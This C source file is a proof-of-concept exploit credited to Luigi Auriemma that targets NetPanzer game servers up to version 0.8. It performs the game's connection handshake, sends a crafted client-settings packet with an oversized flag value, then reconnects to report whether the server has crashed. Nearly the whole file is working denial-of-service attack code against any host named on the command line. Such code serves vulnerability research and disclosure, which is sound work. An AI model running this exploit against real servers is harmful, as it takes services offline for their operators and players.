/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER         "0.1"
#define BUFFSZ      0xffff
#define PORT        3030

#define NETPANZER_PROTOCOL_VERSION  1019

enum { _net_message_id_connect_join_game_request,
       _net_message_id_connect_join_game_request_ack,
       _net_message_id_client_start_connect,
       _net_message_id_client_connect_request,
       _net_message_id_client_connect_result,
       _net_message_id_connect_client_settings,
       _net_message_id_client_connect_process_update,
       _net_message_id_client_connect_process_state_mesg,
       _net_message_id_connect_server_game_setup,
       _net_message_id_connect_client_game_setup_ping,
       _net_message_id_connect_client_game_setup_ack,
       _net_message_id_connect_client_abort,
       _net_message_id_connect_netPanzer_client_disconnect,
       _net_message_id_connect_netPanzer_server_disconnect
     };

enum { _join_request_result_success,
       _join_request_result_invalid_protocol,
       _join_request_result_server_busy
     };

enum { _connect_result_success,
       _connect_result_server_busy,
       _connect_result_server_full
     };



void send_netpanzer(int sd, u_char class, u_char id, u_char *in, u_short insz);
int recv_netpanzer(int sd, u_char *class, u_char *id, u_char *out);
int create_rand_string(u_char *data, int len, u_int *seed);
u_int resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    u_int   ver,
            seed;
    int     sd,
            i,
            len;
    u_short port = PORT;
    u_char  *buff,
            class,
            id;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "NetPanzer <= 0.8 (rev 952) frameNum bug "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target:   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    seed = time(NULL);
    ver  = NETPANZER_PROTOCOL_VERSION;
    printf("- set version %d\n", ver);

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

redo:
    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    printf("- connect ...");
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    printf(" ok\n");

    len = recv_netpanzer(sd, &class, &id, buff);

    send_netpanzer(sd, _net_message_id_client_connect_request, 0, (u_char *)&ver, 4);

    len = recv_netpanzer(sd, &class, &id, buff);

    if(buff[0] == _join_request_result_invalid_protocol) {
        ver = *(u_int *)(buff + 4);
        printf("- set version %u\n", ver);
        close(sd);
        goto redo;
    }

    len = recv_netpanzer(sd, &class, &id, buff);

    send_netpanzer(sd, _net_message_id_client_connect_request, ++id, NULL, 0);

    len = recv_netpanzer(sd, &class, &id, buff);
    if(buff[0] == _join_request_result_server_busy) {
        printf("\nError: server busy or full\n\n");
        exit(1);
    }

    memset(buff, 0, 64);
    create_rand_string(buff, 64 - 1, &seed);    // name
    *(u_short *)(buff + 64) = 0xffff;           // flag... BUG if major than 41
    buff[66]                = 0;                // color
    *(u_int *)(buff + 67)   = 0;                // don't know, server wants 71

    send_netpanzer(sd, _net_message_id_client_connect_request, ++id, buff, 71);

    len = recv_netpanzer(sd, &class, &id, buff);

    send_netpanzer(sd, _net_message_id_client_connect_request, ++id, NULL, 0);

    send_netpanzer(sd, _net_message_id_client_connect_request, ++id, NULL, 0);

    len = recv_netpanzer(sd, &class, &id, buff);

    close(sd);

    printf("- wait some seconds:\n");
    for(i = 3; i; i--) {
        printf("%3d\r", i);
        sleep(ONESEC);
    }

    printf("- check server:\n");
    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer)) < 0) {
        printf("\n  Server IS vulnerable!!!\n\n");
    } else {
        printf("\n  Server doesn't seem vulnerable\n\n");
    }
    close(sd);
    return(0);
}



void send_netpanzer(int sd, u_char class, u_char id, u_char *in, u_short insz) {
    u_short len;

    len = insz + 4;
    send(sd, (void *)&len,   2, 0);
    send(sd, (void *)&class, 1, 0);
    send(sd, (void *)&id,    1, 0);
    send(sd, in, insz, 0);
}



int recv_netpanzer(int sd, u_char *class, u_char *id, u_char *out) {
    int     t;
    u_short i,
            len;

    recv(sd, (void *)&len,     1, 0);
    recv(sd, (void *)&len + 1, 1, 0);
    len -= 2;
    if(len <= 0) return(0);

    recv(sd, (void *)class,    1, 0);
    recv(sd, (void *)id,       1, 0);
    len -= 2;
    if(len <= 0) return(0);

    for(i = 0; i < len; i += t) {
        t = recv(sd, out + i, len - i, 0);
        if(t < 0) std_err();
        if(!t) break;
    }
    return(i);
}



int create_rand_string(u_char *data, int len, u_int *seed) {
    u_int   rnd;
    u_char  *p = data;
    const static u_char table[] =
                "0123456789"
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz";

    rnd = *seed;
    len = rnd % len;
    if(len < 5) len = 5;

    while(len--) {
        rnd = (rnd * 0x343FD) + 0x269EC3;
        rnd >>= 3;
        *p++ = table[rnd % (sizeof(table) - 1)];
    }
    *p = 0;

    *seed = rnd;
    return(p - data);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n",
                host);
            exit(1);
        } else host_ip = *(u_int *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


